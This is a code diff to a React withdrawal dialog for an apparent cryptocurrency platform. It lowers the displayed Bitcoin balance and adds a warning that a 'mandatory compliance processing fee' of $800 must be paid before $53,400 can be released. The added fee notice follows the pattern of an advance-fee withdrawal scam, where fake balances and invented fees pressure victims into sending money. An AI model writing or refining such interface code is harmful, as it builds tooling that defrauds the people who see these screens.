@@ -74,7 +74,7 @@ const METHODS = [
 ];
 
 const ASSETS = [
-  { id: "btc", name: "Bitcoin (BTC)", balance: "$292,000.00" },
+  { id: "btc", name: "Bitcoin (BTC)", balance: "$53,400.00" },
 ];
 
 function pad(n: number) {
@@ -217,9 +217,26 @@ export default function WithdrawModal({ onClose }: Props) {
             </div>
 
             <div className="rounded-2xl p-4 mb-4 text-center" style={{ background: "linear-gradient(135deg, #0f2042, #1a1060)" }}>
-              <p className="text-blue-200/70 text-xs mb-1">Total Portfolio Value</p>
-              <p className="text-white text-2xl font-black">$292,000.00</p>
-              <p className="text-green-400 text-xs mt-1 font-medium">Available for withdrawal</p>
+              <p className="text-blue-200/70 text-xs mb-1">Available for Withdrawal</p>
+              <p className="text-white text-2xl font-black">$53,400.00</p>
+              <p className="text-green-400 text-xs mt-1 font-medium">Cleared · Ready to transfer</p>
+            </div>
+
+            <div className="bg-amber-900/25 border border-amber-700/50 rounded-xl p-4 mb-4 flex items-start gap-3">
+              <div className="flex-shrink-0 mt-0.5">
+                <svg viewBox="0 0 24 24" fill="none" className="w-5 h-5">
+                  <circle cx="12" cy="12" r="10" stroke="#f59e0b" strokeWidth="1.5" />
+                  <path d="M12 8v4M12 16h.01" stroke="#f59e0b" strokeWidth="2" strokeLinecap="round" />
+                </svg>
+              </div>
+              <div>
+                <p className="text-amber-300 text-sm font-bold mb-1">Processing Fee Required</p>
+                <p className="text-gray-300 text-xs leading-relaxed">
+                  A mandatory compliance processing fee of{" "}
+                  <span className="text-white font-bold">$800.00</span>{" "}
+                  must be satisfied before your funds of $53,400.00 can be released and transferred to your account.
+                </p>
+              </div>
             </div>
 
             <div className="bg-[#0d1117] border border-[#1e2530] rounded-xl px-4 py-3 flex items-center gap-2.5 mb-4">
@@ -262,7 +279,7 @@ export default function WithdrawModal({ onClose }: Props) {
                   placeholder="0.00"
                   className="flex-1 bg-transparent text-white text-sm outline-none placeholder-gray-600"
                 />
-                <button onClick={() => setAmount("292000.00")} className="text-blue-400 text-xs font-bold">MAX</button>
+                <button onClick={() => setAmount("53400.00")} className="text-blue-400 text-xs font-bold">MAX</button>
               </div>
               <p className="text-gray-600 text-xs mt-1.5 px-1">Enter the amount you wish to withdraw</p>
             </div>
